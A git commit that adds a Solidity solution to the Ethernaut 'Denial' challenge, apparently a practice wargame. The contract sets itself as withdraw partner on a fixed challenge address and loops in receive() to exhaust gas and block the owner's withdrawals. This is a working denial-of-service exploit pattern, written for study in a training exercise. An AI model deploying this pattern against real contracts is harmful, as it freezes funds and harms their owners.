32fb945107e792d3fe203b8bf3f42373df6f2ef3
Rionaldi <193679388+orionnion@users.noreply.github.com>
2025-09-01 23:02:06 +0700

    Solve Denial challenge

---
+++ script/EthernautDenial.s.sol
@@ -0,0 +1,18 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import {Denial} from "../src/EthernautDenial.sol";
+
+contract DenialSolution {
+    Denial denial = Denial(payable(0x04C8827B6C5006e4790F46562cc3177F3CC36EB7));
+
+    constructor() {
+        denial.setWithdrawPartner(address(this));
+    }
+
+    receive() external payable {
+        for (uint256 i = 0; i < type(uint256).max; i++) {
+            i += 1;
+        }
+    }
+}
